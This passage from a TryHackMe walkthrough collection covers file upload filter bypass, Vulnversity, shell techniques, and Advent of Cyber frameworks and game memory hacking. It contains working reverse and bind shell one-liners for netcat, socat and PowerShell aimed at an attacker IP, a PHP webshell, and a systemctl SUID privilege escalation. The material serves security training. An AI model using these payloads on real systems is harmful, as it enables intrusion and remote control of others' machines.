<code>THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}</code></p>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-10-example-methodology","title":"Task 10 - Example Methodology","text":"<p>Following is a basic methodology on how to approach the task of file upload filter bypass.</p> <ol> <li>Look at the web application as a whole to determine what languages and frameworks the web application might have been built with. HTTP request headers intercepted by Burp Suite can provide valuable information about the server.</li> <li>Enumerate the host using tools like <code>feroxbuster</code> to look for attack vectors such as an uploads page.</li> <li>Analyze source-code for the web application for any client-side scripts implementing client-side filters.</li> <li>Upload an innocent file and figure out how the uploaded file can be be accessed. This serves to create a baseline accepted file which can be used for further testing. An important switch in <code>feroxbuster</code> is <code>-x</code> which can be used to look for files with specific file extensions like <code>.php</code>, <code>.txt</code>, and <code>.html</code>. This can be quite useful if an attacker has managed to upload a payload and the server is changing the name of uploaded files.</li> <li>Having ascertained how and where uploaded files are being accessed, attempt a malicious file upload. Any error messages encountered during filter bypass attempts can provide valuable information on the kind of filter being employed.</li> </ol> <p>Assuming that our malicious upload was stopped by the server, here are some ways to ascertain what kind of server-side filter may be in place:</p> <ol> <li>If you can successfully upload a file with a completely invalid/random file extension (ie. image.invalidfileformat) then the chances are that the server is using an extension blacklist filter. If this file upload fails then a whitelist filter is being employed.</li> <li>Try re-uploading an innocent file accepted by the server but change the magic number to be something you would expect to be filtered. If the upload fails then the server is employing magic number based filter.</li> <li>As with the previous attempt, try uploading and innocent file accepted by the server but intercept the request with Burp Suite and modify the MIME type (Content-Type) to something that you would expect to be filtered. If the upload fails then the server is filtering on MIME types.</li> <li>Enumerate file length filters by uploading progressively bigger files until you hit the filter limit. Be aware that a small file length limit may prevent you from uploading the reverse shell we've been using throughout this room.</li> </ol>"},{"location":"walkthroughs/thm/uploadvulnerabilities/#task-11-challenge","title":"Task 11 - Challenge","text":"<p>Let's apply everything we've learnt so far to retrieve a flag from <code>/var/www/</code>.</p> <p>Navigate to <code>http://jewel.uploadvulns.thm</code> and begin enumerating the host for more information.</p> <p>Looking at the page source code, we notice a Javascript file named <code>upload.js</code>.</p> <p><pre><code>$(document).ready(function () {\n  let errorTimeout;\n  const fadeSpeed = 1000;\n  function setResponseMsg(responseTxt, colour) {\n    $('#responseMsg').text(responseTxt);\n    if (!$('#responseMsg').is(':visible')) {\n      $('#responseMsg').css({\n        'color': colour\n      }).fadeIn(fadeSpeed)\n    } else {\n      $('#responseMsg').animate({\n        color: colour\n      }, fadeSpeed)\n    }\n    clearTimeout(errorTimeout);\n    errorTimeout = setTimeout(() =&gt;{\n      $('#responseMsg').fadeOut(fadeSpeed)\n    }, 5000)\n  }\n  $('#uploadBtn').click(function () {\n    $('#fileSelect').click()\n  });\n  $('#fileSelect').change(function () {\n    const fileBox = document.getElementById('fileSelect').files[0];\n    const reader = new FileReader();\n    reader.readAsDataURL(fileBox);\n    reader.onload = function (event) {\n      //Check File Size\n      if (event.target.result.length &gt; 50 * 8 * 1024) {\n        setResponseMsg('File too big', 'red');\n        return;\n      }      //Check Magic Number\n\n      if (atob(event.target.result.split(',') [1]).slice(0, 3) != '\u00ff\u00d8\u00ff') {\n        setResponseMsg('Invalid file format', 'red');\n        return;\n      }      //Check File Extension\n\n      const extension = fileBox.name.split('.') [1].toLowerCase();\n      if (extension != 'jpg' &amp;&amp; extension != 'jpeg') {\n        setResponseMsg('Invalid file format', 'red');\n        return;\n      }\n      const text = {\n        success: 'File successfully uploaded',\n        failure: 'No file selected',\n        invalid: 'Invalid file type'\n      };\n      $.ajax('/', {\n        data: JSON.stringify({\n          name: fileBox.name,\n          type: fileBox.type,\n          file: event.target.result\n        }),\n        contentType: 'application/json',\n        type: 'POST',\n        success: function (data) {\n          let colour = '';\n          switch (data) {\n            case 'success':\n              colour = 'green';\n              break;\n            case 'failure':\n            case 'invalid':\n              colour = 'red';\n              break\n          }\n          setResponseMsg(text[data], colour)\n        }\n      })\n    }\n  })\n});\n</code></pre> The Javascript file implements client-side file size, magic number, and file extension filters. Based on the above code, our file needs to be:   - Greater than 409.6kb   - Needs magic number: FF D8 FF   - Needs file extension: jpg or jpeg</p> <p>With Burp Suite let's capture a request to the home page. Keep forwarding the requests until a request for <code>/assets/js/upload.js</code> is made. Right-click and select <code>Do intercept - Response to this request</code> as we want to be able to intercept <code>upload.js</code> in Burp Suite to remove the client-side filters. Keep forwarding the requests until we intercept the response we are interested in.</p> <p></p> <p>Delete the <code>Check File Size</code>, <code>Check Magic Number</code>, and <code>Check File Extension</code> client-side filters and forward the request. This should now allow us to bypass the implemented client-side filters. By capturing the request with Burp Suite, we also find that the server is powered by <code>ExpressJs with NodeJS</code>.</p> <p></p> <p>Upload a standard JPEG and enumerate the host to see possible locations where our file could be uploaded to.</p> <p></p> <p>Looks like three possibilities <code>/admin</code>, <code>/modules</code>, and <code>/content</code>. Let's rerun a <code>feroxbuster</code> scan on the <code>/content</code> folder using the custom wordlist provided by the challenge. The new scan with the custom wordlist shows a list of JPEG images including the one which we uploaded earlier: <code>http://jewel.uploadvulns.thm/content/TCK.jpg</code></p> <p></p> <p></p> <p>Since we know that the web server is powered by NodeJS, let's download a reverse shell from here.</p> <p>Save the reverse shell as <code>shell.jpg</code> in attempt to bypass any server-side MIME filters (this is purely a guess at this moment as MIME type filters have not appeared in the challenge). Ensure the IP and port numbers are modified before uploading the file. Looks like using the <code>.jpg</code> extension we are able to bypass the server-side MIME filter (note that <code>shell.js</code> was tried before this and resulted in failure to upload).</p> <p></p> <p>Let's run another <code>feroxbuster</code> scan of the <code>/contents</code> folder to track down our renamed shell file.</p> <p></p> <p>Of all the listed files, only <code>/NEF.jpg</code> was not an image so it must be our uploaded shell.</p> <p>Setup a Netcat listener to listen on port 1234 and navigate to and <code>http://jewel.uploadvulns.thm/admin</code>.</p> <p>To execute the payload, enter <code>../content/NEF.jpg</code> in the command box and execute to gain our shell.</p> <p></p> <p>Retrieved Flag: <code>THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}</code></p>"},{"location":"walkthroughs/thm/vulnversity/","title":"Vulnversity","text":""},{"location":"walkthroughs/thm/vulnversity/#reconosint","title":"Recon/OSINT","text":"<p>Target IP: 10.10.181.213 (<code>$IP</code>)</p>"},{"location":"walkthroughs/thm/vulnversity/#enumeration","title":"Enumeration","text":""},{"location":"walkthroughs/thm/vulnversity/#nmap-scan","title":"Nmap Scan","text":"<p>Enumerate open ports and services on the machine using Nmap.</p> <p><pre><code>$ nmap -sV -oN nmap.output $IP\n</code></pre> </p>"},{"location":"walkthroughs/thm/vulnversity/#feroxbuster-scan","title":"Feroxbuster Scan","text":"<p>Enumerate hidden directories and subdomains.</p> <p><pre><code>$ feroxbuster -u http://$IP:3333 -o ferox.output\n</code></pre> </p> <p>Found image upload form under directory <code>/internal/</code></p>"},{"location":"walkthroughs/thm/vulnversity/#exploitation","title":"Exploitation","text":"<p>Image upload form is filtering file extensions preventing us from uploading a potential <code>.php</code> exploit file. Using <code>Burpsuite Repeater</code> tried different PHP extensions (<code>.php, .php3, .php4, .php5, .phtml</code>) to see if the filter is bypassed.</p> <p>The upload form is susceptible to a <code>.phtml</code> extension.</p> <p></p> <p></p> <p>Downloaded reverse PHP shell from Pentest Monkey and renamed the extension to <code>.phtml</code>.</p> <p>Started Netcat listener on port 1234.</p> <p><pre><code>$ nc -lvnp 1234\n</code></pre> Uploaded <code>shell.phtml</code> and navigated to <code>http://$IP:3333/internal/upload/shell.phtml</code> to get the shell.</p> <p></p> <p>Stabilized shell with: <pre><code>$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> Pressed <code>CTRL + Z</code> to background process and get back to the host machine. Used <code>stty</code> command to set terminal line settings and foreground back the target terminal.</p> <p><pre><code>$ stty raw -echo; fg\n</code></pre> Set terminal emulator to xterm.</p> <p><pre><code>$ export TERM=xterm\n</code></pre> Now we can use tab autocomplete and other standard terminal shortcuts.</p> <p>Found user flag:</p> <p></p>"},{"location":"walkthroughs/thm/vulnversity/#privilege-escalation","title":"Privilege Escalation","text":"<p>Search for all files on the filesystem with SUID bit set.</p> <p><pre><code>$ find / -perm -4000 2&gt;/dev/null\n</code></pre> OR</p> <p><pre><code>$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null\n</code></pre> SUID bit is set on <code>/bin/systemctl</code> which can be exploited to escalate privileges.</p> <p></p> <p>From GTFOBins:</p> <p><pre><code>$ TF=$(mktemp).service\n$ echo '[Service]\n&gt;Type=oneshot\n&gt;ExecStart=/bin/sh -c \"cat /root/root.txt &gt; /tmp/output\"\n&gt;[Install]\n&gt;WantedBy=multi-user.target' &gt; $TF\n</code></pre> <pre><code>$ ./systemctl link $TF\n</code></pre> <pre><code>$ ./systemctl enable --now $TF\n</code></pre> </p> <p>Alternatively set SUID on /bin/bash and run bash -p to get root:  <code>ExecStart=/bin/sh -c \"chmod +s /bin/bash\"</code></p>"},{"location":"walkthroughs/thm/whattheshell/","title":"What the shell?","text":""},{"location":"walkthroughs/thm/whattheshell/#additional-resources","title":"Additional Resources","text":"<ul> <li>Payloads All the Things</li> <li>Reverse Shell Cheatsheet</li> <li>Reverse Shell Generator</li> </ul>"},{"location":"walkthroughs/thm/whattheshell/#task-1-what-is-a-shell","title":"Task 1 - What is a shell?","text":"<p>In its simplest form, shells are what we use when interfacing with a Command Line environment (CLI). The common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows.</p>"},{"location":"walkthroughs/thm/whattheshell/#task-2-tools","title":"Task 2 - Tools","text":"<p>There are a variety of tools that can be used to receive reverse shells and to send bind shells.</p>"},{"location":"walkthroughs/thm/whattheshell/#netcat","title":"Netcat","text":"<p>Netcat is the \"Swiss Army Knife\" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, receive reverse shells, and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable by default but there are techniques to stabalize the shell (more below).</p>"},{"location":"walkthroughs/thm/whattheshell/#socat","title":"Socat","text":"<p>Socat is essentially Netcat on steroids. It can do everything Netcat can and much more. Socat shells are usually more stable out of the box. It should be noted that when compared to Netcat: - Socat's syntax is more difficult. - Netcat is installed on virtually every Linux distro by default while Socat is rarely installed by default.</p>"},{"location":"walkthroughs/thm/whattheshell/#metasploit-multihandler","title":"Metasploit - multi/handler","text":"<p>The <code>auxiliar/multi/handler</code> module of Metasploit Framework is used to receive reverse shells. Due to being part of Metasploit Framework, multi/handler provides a fully-fledged way to obtain stable shells. It is also the only way to interact with a Meterpreter shell and is the easiest way to handle staged payloads.</p>"},{"location":"walkthroughs/thm/whattheshell/#msfvenom","title":"Msfvenom","text":"<p>Like multi/handler, msfvenom is technically part of the Metasploit Framework but is shipped as a standalone tool and can be used to generate payloads on the fly.</p>"},{"location":"walkthroughs/thm/whattheshell/#other-tools","title":"Other Tools","text":"<p>Beside the tools listed above, there are repositories of shells in many different programming languages. Two of the most prominent are Payloads All the Things and Reverse Shell Cheatsheet.</p> <p>Online generators such as Reverse Shell Generator can make generating code for shells a trivial task.</p> <p>Kali also comes pre-installed with a variety of webshells located at <code>/usr/share/webshells</code> and <code>/usr/share/seclists/Web-Shells</code>.</p>"},{"location":"walkthroughs/thm/whattheshell/#task-3-types-of-shell","title":"Task 3 - Types of Shell","text":"<p>The following are two types of shells which are useful when exploiting a target: - Reverse Shells: Require the remote target to execute code that connects back to your computer. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target. The main drawback to reverse shells is that when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell (ie: port forwarding). - Bind Shells: Requires the remote target to execute code to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network but may be prevented by firewalls protecting the target. Note that port forwarding on the remote host would be required when connecting to the shell from the internet.</p> <p>As a general rule, reverse shells are easier to execute and debug.</p> <p>Shells can be either interactive or non-interactive: - Interactive Shells: These shells allow you to interact with programs after executing them. - Non-Interactive Shells: In these shells you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, majority of simple reverse and bind shells are non-interactive.</p>"},{"location":"walkthroughs/thm/whattheshell/#task-4-netcat","title":"Task 4 - Netcat","text":"<p>Netcat is the most basic took in a pentester's toolkit.</p>"},{"location":"walkthroughs/thm/whattheshell/#reverse-shells","title":"Reverse Shells","text":"<p>There are many ways to execute a shell. Let's start by looking at listeners. The syntax for starting a Netcat listener using Linux is as follows:</p> <p><pre><code>nc -lvnp &lt;port-number&gt;\n\n# -l is used to tell Netcat that this will be a listener.\n# -v is used to request a verbose output.\n# -n tells Netcat not to resolve host names or use DNS.\n# -p indicates that the port specification will follow.\n</code></pre> Note that if you use a port number below 1024, you will need to use <code>sudo</code> when starting the listener. It is generally a good idea to use a well-known port number (80, 443, or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.</p>"},{"location":"walkthroughs/thm/whattheshell/#bind-shells","title":"Bind Shells","text":"<p>A bind shell on a target requires that there is already a listener waiting on a chosen port of the target. All we need to do is then connect to it. The syntax for this is as follows:</p> <p><pre><code>nc &lt;target-ip&gt; &lt;chosen-port&gt;\n</code></pre> Here we are using Netcat to make an outbound connection to the target on our chosen port.</p>"},{"location":"walkthroughs/thm/whattheshell/#task-5-netcat-shell-stabilization","title":"Task 5 - Netcat Shell Stabilization","text":"<p>As mentioned previously, Netcat shells are unstable by default. These shells are non-interactive and often have formatting errors. This is due to Netcat shells being processes running inside a terminal. There are many ways to stabilize Netcat shells on Linux systems. Let's look at three common techniques.</p>"},{"location":"walkthroughs/thm/whattheshell/#python","title":"Python","text":"<p>Most Linux machines typically have Python installed by default. This is three stage process: 1. Use <code>python -c 'import pty;pty.spawn(\"/bin/bash\")</code>, which uses Python to spawn a better featured bash shell. At this point our shell will look a little \"prettier\" but we won't be able to use TAB autocomplete or the arrow keys. CTRL+C will kill the shell. 2. Use <code>export TERM=xterm</code>. This will give us access to term commands such as <code>clear</code>. 3. Finally, background the shell using CTRL+Z. Back in our own terminal use <code>stty raw -echo; fg</code>. This turns off our own terminal echo (which gives us access to tab autocomplete, arrow keys, and CTRL+C to kill processes). It then foregrounds the remote shell thereby completing the process.</p> <p>See [[cheatsheets.shellstabilisation]].</p> <p>Note that if the shell dies or the session is closed, any input in your own terminal will not be visible due to the <code>-echo</code> command. To fix this, simply type <code>reset</code> and press the ENTER key.</p>"},{"location":"walkthroughs/thm/whattheshell/#rlwrap","title":"rlwrap","text":"<p>rlwrap is a program which gives us access to history, TAB autocomplete and arrow keys immediately upon receiving a shell. Some manual stabilization is still required to use CTRL+C inside the shell though.</p> <p>rlwrap is not installed by default on Linux and needs to be installed using the packet manager for the distribution (ie: <code>sudo apt install rlwrap</code>).</p> <p>To use wlwrap, the listener needs to be invoked as follows:</p> <p><pre><code>rlwrap nc -lvnp &lt;port-number&gt;\n</code></pre> By prepending our Netcat listener with \"rlwrap\", we are able to receive a more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise very difficult to stabilize.</p>"},{"location":"walkthroughs/thm/whattheshell/#socat_1","title":"Socat","text":"<p>The third easiest way to stabilize a shell is to quite simply use an initial Netcat shell as a stepping stone into a more fully-featured Socat shell.</p> <p>Note that this technique is limited to Linux targets only as Socat on Windows is as unstable as a Netcat shell.</p> <p>We utilize this, we are required to first transfer a Socat static compiled binary onto the target machine. A Python HTTP server can be used to host the file. The Netcat shell on the target can then be used to download the file.</p>"},{"location":"walkthroughs/thm/whattheshell/#task-6-socat","title":"Task 6 - Socat","text":"<p>The easiest way to thing about Socat is as a connector between two points. All Socat does is provide a link between two points.</p>"},{"location":"walkthroughs/thm/whattheshell/#reverse-shells_1","title":"Reverse Shells","text":"<p>The following is the syntax for a basic reverse shell listener in Socat:</p> <p><pre><code>Socat TCP-L:&lt;port-number&gt; -\n</code></pre> On Windows, the command to connect back is as follows:</p> <p><pre><code>socat TCP:&lt;Local-IP&gt;:&lt;Local-Port&gt; EXEC:powershell.exe,pipes\n</code></pre> The \"pipes\" option is used to force Powershell (or cmd.exe) to use Unix style standard input and output.</p> <p>The equivalent command for a Linux target is as follows:</p> <p><pre><code>socat TCP:&lt;Local-IP&gt;:&lt;Local-Port&gt; EXEC:\"bash -li\"\n</code></pre> The above commands are for very basic Socat listeners and payloads. A more advanced listener and payload can be setup when targeting a Linux machine with the following syntax:</p> <p><pre><code>socat TCP-L:&lt;Port-Number&gt; FILE:`tty`,raw,echo=0\n</code></pre> In the above listener command, we are passing in the current TTY as a file and setting the echo to be zero. This is similar to using CTRL+Z,<code>stty raw -echo; fg</code> trick with Netcat shells but with the added bonus of being able to immediately stabilize and hook into a full TTY.</p> <p>The advanced listener can be connected with any payload; however, the following payload is very useful when targeting Linux machines:</p> <pre><code>socat TCP:&lt;Attacker-IP&gt;:&lt;Attacker-Port&gt; EXEC:\"bash -li\",pty,stderr,sigint,setsid,sane\n\n# - pty: allocates a pseudo-terminal on the target.\n# - stderr: makes sure that any error messages get shown in the shell.\n# - sigint: passes any CTRL+C commands through into the sub-process.\n# - setsid: creates the process in a new session.\n# - sane: stabilizes the terminal attempting to \"normalize\" it.\n</code></pre>"},{"location":"walkthroughs/thm/whattheshell/#bind-shells_1","title":"Bind Shells","text":"<p>On a Linux target, we would use the following command to create a bind shell:</p> <p><pre><code>socat TCP-L:&lt;Port-Number&gt; EXEC:\"bash -li\"\n</code></pre> On a Windows target, we would use the following command to create a bind shell:</p> <p><pre><code>socat TCP-L:&lt;Port-Number&gt; EXEC:powershell.exe,pipes\n</code></pre> Regardless of the target, we use the following command on the attacking machine to connect to the waiting listener:</p> <pre><code>socat TCP:&lt;Target-IP&gt;:&lt;Target-Port&gt; -\n</code></pre>"},{"location":"walkthroughs/thm/whattheshell/#task-7-socat-encrypted-shells","title":"Task 7 - Socat Encrypted Shells","text":"<p>One of the many good things about Socat is that it's capable of creating both bind and reverse encrypted shells. To allow for encrypted shells, we first need to generate an SSL certificate. This can be done using OpenSSL which comes installed default on Linux machines with the following syntax:</p> <p><pre><code>openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt\n</code></pre> This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for 362 days. When we run this command it will ask us to fill in information about the certificate. This can be left blank, or filled randomly.</p> <p>Now we need to merge the two files created by OpenSSL together into a single <code>.pem</code> file.</p> <p><pre><code>cat shell.key shell.crt &gt; shell.pem\n</code></pre> With the <code>.pem</code> file created, we can now set up our reverse shell listener with the following command:</p> <p><pre><code>socat OPENSSL-LISTEN:&lt;Port-Number&gt;,cert=shell.pem,verify=0 -\n</code></pre> This sets up an OPENSSL listener using our generated certificate. The <code>verify=0</code> tells the connection to not bother trying to validate if our certificate has been properly signed by a recognized authority.</p> <p>Note that the certificate must be used on whichever device is listening.</p> <p>To connect back (ie: payload), the following command can be used:</p> <p><pre><code>socat OPENSSL:&lt;Attacker-IP&gt;:&lt;Attacker-Port&gt;,verify=0 EXEC:/bin/bash\n</code></pre> For bind shells, the same technique would apply:</p> <p><pre><code># Target Machine (Windows Example)\n\nsocat OPENSSL-LISTEN:&lt;Port-Number&gt;,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes\n\n# Attacker Machine\n\nsocat OPENSSL:&lt;Target-IP&gt;:&lt;Target-PORT&gt;,verify=0 -\n</code></pre> Note that the certificate must be copied over to the target machine prior to creating a bind listener.</p>"},{"location":"walkthroughs/thm/whattheshell/#task-8-common-shell-payloads","title":"Task 8 - Common Shell Payloads","text":"<p>This tasks covers some common payloads using the tools we have already discussed above.</p> <p>A simple Netcat payload can be made as follows:</p> <p><pre><code># Bind Shell Listener\nnc -lvnp &lt;Port-Number&gt; -e /bin/bash\n\n# Reverse Shell Payload\nnc &lt;Attacker-IP&gt; &lt;Attacker-Port&gt; -e /bin/bash\n</code></pre> If the target is not using <code>netcat-traditional</code> we will not be able to use the above commands. In this event the following commands using named pipes will prove useful:</p> <p><pre><code># Bind Shell Listener\nmkfifo /tmp/f; nc -lvnp &lt;Port-Number&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f\n\n# Reverse Shell Payload\nmkfifo /tmp/f; nc &lt;Attacker-IP&gt; &lt;Attacker-Port&gt; &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f\n</code></pre> When targeting Windows systems, a Powershell one liner can be very useful.</p> <p><pre><code>powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('&lt;Attacker-IP&gt;',&lt;Attacker-Port&gt;);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n</code></pre> Multitude of payloads can be generated for both Linux and Windows at: Reverse Shell Generator</p>"},{"location":"walkthroughs/thm/whattheshell/#task-9-msfvenom","title":"Task 9 - Msfvenom","text":"<p>Msvenom is considered the one-stop-shop for all things payload related. Being part of the Metasploit Framework, Msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hex shellcode when developing something like a Buffer Overflow exploit.</p> <p>The standard syntax for Msfvenom is as follows:</p> <p><pre><code>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;\n</code></pre> Various payloads can be listed using the command <code>--list-payloads</code>. All relevant options can be listed using the <code>-h</code> syntax.</p>"},{"location":"walkthroughs/thm/whattheshell/#staged-vs-stageless","title":"Staged vs Stageless","text":"<ul> <li>Staged payloads are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the target itself. It then connects back to a waiting listener and downloads the real payload; executing it in memory without the payload every touching the disk. Staged payloads require a special listener (usually multi/handler).</li> <li>Stageless payloads are more common. These are self-contained in that there is only one piece of code which, when executed, sends a shell back immediately to the waiting listener.</li> </ul> <p>Stageless payloads tend to be easier to catch and use. They are larger in size and easier for an antivirus or IDS/IPS to discover and remove.</p> <p>Modern day antivirus solutions make use of the Anti-Malware Scan Interface (AMSI) to detect payloads as they are loaded into memory by a stager. This makes staged payloads less effective then they once were.</p>"},{"location":"walkthroughs/thm/whattheshell/#task-10-metasploit-multihandler","title":"Task 10 - Metasploit multi/handler","text":"<p>Multi/handler is an excellent tool for catching reverse shells. It is essential if you want to use Meterpreter shells.</p> <p>To use multi/handler, open Metasploit Framework using <code>msfvonsole</code> and type <code>use multi/handler</code>.</p> <p>multi/handler defaults to a <code>generic/shell_reverse_tcp</code> payload so depending on what payload was selected, this may need to be modified using the <code>set payload &lt;PAYLOAD&gt;</code> command. Listing options using the <code>options</code> command shows all the options (including the required options necessary for the module to function).</p>"},{"location":"walkthroughs/thm/whattheshell/#task-11-webshells","title":"Task 11 - WebShells","text":"<p>Webshell is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage (either through an HTML form or directly as arguments in the URL) which are then executed by the script. The results are returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.</p> <p>As PHP is still the most common server side scripting language, let's look at an example code for this.</p> <p><pre><code>&lt;?php echo \"&lt;pre&gt;\" . shell_exec($_GET[\"cmd\"]) . \"&lt;/pre&gt;\"; ?&gt;\n</code></pre> This will take a GET parameter in the URL and execute it on the system with <code>shell_exec()</code> command. Essentially, what this means is that any command we enter in the URL after <code>?cmd=</code> will be executed on the system. The \"pre\" elements are there to ensure that the results are formatted correctly on the page.</p>"},{"location":"walkthroughs/thm/whattheshell/#tasks-12-15","title":"Tasks 12-15","text":"<p>Tasks 12-15 cover practical hands-on practice of the different shell techniques discussed in this room.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day1/","title":"Day 01 - Frameworks","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day1/#introduction","title":"Introduction","text":"<p>Note</p> <p>Security frameworks are documented processes that define policies and procedures organisations should follow to establish and manage security controls. They are blueprints for identifying and managing the risks they may face and the weaknesses in place that may lead to an attack.</p> <p>Frameworks help organisations remove the guesswork of securing their data and infrastructure by establishing processes and structures in a strategic plan. This will also help them achieve commercial and government regulatory requirements.</p> <p>Topics covered include NIST Cybersecurity Framework (CSF), ISO 27000 Series, MITRE ATT&amp;CK Framework, Cyber Kill Chain, and Unified Kill Chain.</p> <p>Unified Kill Chain can be described as a unification of the MITRE ATT&amp;CK and Cyber Kill Chain frameworks and describes 18 phases of attack based on Tactics, Techniques, and Procedures (TTPs).  The individual phases can be combined to form overarching goals, such as gaining an initial foothold in a targeted network, navigating through the network to expand access, and performing actions on critical assets.</p> <p>The phases of Unified Kill Chain are represented as follows (copied from Advent of Cyber 2022):</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day1/#cycle-1-in","title":"CYCLE 1: In","text":"<p>The main focus of this series of phases is for an attacker to gain access to a system or networked environment. Typically, cyber-attacks are initiated by an external attacker. The critical steps they would follow are: </p> <ul> <li> <p>Reconnaissance: The attacker performs research on the target using publicly available information (OSINT).</p> </li> <li> <p>Weaponisation: The attacker sets up the necessary infrastructure to host the command and control centre (C2).</p> </li> <li> <p>Delivery: The attacker delivers payloads to the target through numerous means, such as email phishing and supply chain attacks.</p> </li> <li> <p>Social Engineering: The attacker tricks their target into performing untrusted and unsafe action against the payload they just delivered, often making their message appear to come from a trusted in-house source.</p> </li> <li> <p>Exploitation: The attacker abuses an existing vulnerability on the targets network infrastructure to trigger their payload.</p> </li> <li> <p>Persistence: The attacker leaves behind a fallback presence on the network or asset to make sure they have a point of access to their target.</p> </li> <li> <p>Defence Evasion: The attacker attempts to gain anonymity by disabling and avoiding any security defence mechanisms, including deleting evidence of their presence.</p> </li> <li> <p>Command &amp; Control: A communication channel between the compromised system and the attacker\u2019s infrastructure is established across the internet.</p> </li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day1/#cycle-2-through","title":"CYCLE 2: Through","text":"<p>Under this phase, attackers will be interested in gaining more access and privileges to assets within the network.</p> <p>The attacker may repeat this phase until the desired access is obtained.</p> <ul> <li> <p>Discovery: The attacker will seek to gather as much information about the compromised system, such as available users and data. Alternatively, they may remotely discover vulnerabilities and assets within the network. This opens the way for the next phase.</p> </li> <li> <p>Privilege Escalation: Restricted access prevents the attacker from executing their mission. Therefore, they will seek higher privileges on the compromised systems by exploiting identified vulnerabilities or misconfigurations.</p> </li> <li> <p>Execution: With elevated privileges, malicious code may be downloaded and executed to extract sensitive information or cause further havoc on the system.</p> </li> <li> <p>Credential Access: Part of the extracted sensitive information would include login credentials stored in the hard disk or memory. This provides the attacker with more firepower for their attacks.</p> </li> <li> <p>Lateral Movement: Using the extracted credentials, the attacker may move around different systems or data storages within the network, for example, within a single department.</p> </li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day1/#cycle-3-out","title":"CYCLE 3: Out","text":"<p>The Confidentiality, Integrity and Availability (CIA) of assets or services are compromised during this phase.</p> <ul> <li> <p>Collection: The attacker will seek to aggregate all the information they need. By doing so, the assets\u2019 confidentiality would be compromised entirely, especially when dealing with trade secrets and financial or personally identifiable information (PII) that is to be secured.</p> </li> <li> <p>Exfiltration: The attacker extract the aggregated information out of the network. Various techniques may be used to ensure they have achieved their objectives without triggering suspicion.</p> </li> <li> <p>Impact: When compromising the availability or integrity of an asset or information, the attacker will use all the acquired privileges to manipulate, interrupt, and sabotage. Imagine the reputation, financial, and social damage an organisation would have to recover from.</p> </li> <li> <p>Objectives: Attackers may have other goals to achieve that may affect the social or technical landscape that their targets operate within. Defining and understanding these objectives tends to help security teams familiarise themselves with adversarial attack tools and conduct risk assessments to defend their assets.</p> </li> </ul>"},{"location":"walkthroughs/thm/adventofcyber2022/day10/","title":"Day 10 - Hack a Game","text":""},{"location":"walkthroughs/thm/adventofcyber2022/day10/#introduction","title":"Introduction","text":"<p>An executed program has all its data processed through the computer's RAM. Modifying contents of the memory address of a running software can have unintended effects on its operation and functionality.</p> <p>Cetus is a simple browser plugin that enables exploration of the memory space of Web Assembly games that run in your browser. The main premise behind the tool is to provide a simple method to find any piece of data stored in memory and modify it as needed. You can also modify a game's compiled code and alter its behaviour.</p>"},{"location":"walkthroughs/thm/adventofcyber2022/day10/#ctf-questions","title":"CTF Questions","text":"<p>The guard wants us to guess a number between 1 and 99999999 (most likely a 32 bit integer). If the number we guess is correct, he will open the door and provide the Guard's flag. </p> <p>With <code>Cetus</code> fired up, lets make a random guess of <code>9</code>. The guard's number was <code>68275416</code>. Let's see where that number is stored in the memory space. Looks like the the game writes the guard's number at memory address <code>0x0411ccd8</code>. Note that all data is written in <code>hexadecimal</code> in the memory space.</p> <p>Since we know the memory address of where the guard's number is stored, we can modify the value to be whatever we desire. Talk to the guard again and prior to entering a new guess, modify the data at the memory address <code>0x0411ccd8</code> to and arbitrary value of <code>99</code> or <code>0x63</code> in hex. Entering the modified value in the dialog box with the guard allows us to obtain the his flag: <code>THM{5_star_Fl4gzzz}</code>.</p> <p>In order to get the Yeti's flag we need to get pass through a gauntlet of snowballs which reduce your overall HP every time you are struck by a ball. Since HP must be stored as a value in the memory space, we can use a <code>Differential Search</code> in <code>Cetus</code> to find the memory address where the HP data is stored. The process would be a to search the memory space for values which are consistently decreasing every time our HP is lost. For this we can use the <code>LT</code> or less than comparison operator.</p> <p>Initial <code>Differential Search</code> reveals 458753 results. Let's get hit by a snowball to reduce our HP and refine our search further. Looks like the HP data is stored at memory address <code>0x0004b4a4</code>. Let's 